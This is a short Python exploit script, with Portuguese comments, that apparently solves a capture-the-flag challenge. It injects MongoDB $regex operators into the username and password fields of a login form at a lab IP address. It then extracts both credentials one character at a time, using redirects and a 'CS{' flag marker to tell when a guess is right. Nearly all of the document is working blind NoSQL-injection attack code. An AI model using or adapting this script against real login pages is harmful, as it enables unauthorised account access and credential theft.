import requests
import string
import time

TARGET = 'http://10.10.0.25'
CHARSET = string.ascii_letters + string.digits + string.punctuation

def req(username_regex, password_regex, retries=10, delay=5):
    data = {
        "username[$regex]": f"^{username_regex}",
        "password[$regex]": f"^{password_regex}"
    }
    for attempt in range(retries):
        try:
            res = requests.post(TARGET, data=data, timeout=10)
            return res
        except requests.exceptions.ConnectionError:
            print(f"  [!] Conexão falhou, tentativa {attempt+1}/{retries} — aguardando {delay}s...")
            time.sleep(delay)
    raise Exception("Servidor inacessível após todas as tentativas")

def escape(c):
    if c in r'\.^$*+?{}[]|()':
        return '\\' + c
    return c

def extract_field(label, fixed_user=None, known_prefix=''):
    found = known_prefix  # permite retomar de onde parou
    print(f"[*] Extraindo {label}... (prefixo conhecido: '{found}')")

    while True:
        char_found = False
        for c in CHARSET:
            ec = escape(c)

            if fixed_user is None:
                resp = req(found + ec, ".*")
            else:
                resp = req(fixed_user, found + ec)

            if resp.status_code == 302 or "CS{" in resp.text or "success" in resp.text.lower():
                found += c
                print(f"[+] {label} parcial: {found}")
                char_found = True
                break

        if not char_found:
            print(f"[✓] {label} completo: {found}")
            break

        if len(found) > 100:
            print("[!] Limite atingido")
            break

    return found

if __name__ == '__main__':
    # Username já conhecido, pula direto para senha com prefixo já extraído
    username = extract_field("username")
    print(f"[✓] Username (já conhecido): {username}\n")

    password = extract_field("password", fixed_user=username, known_prefix="S")
    print(f"\n[✓] Password: {password}")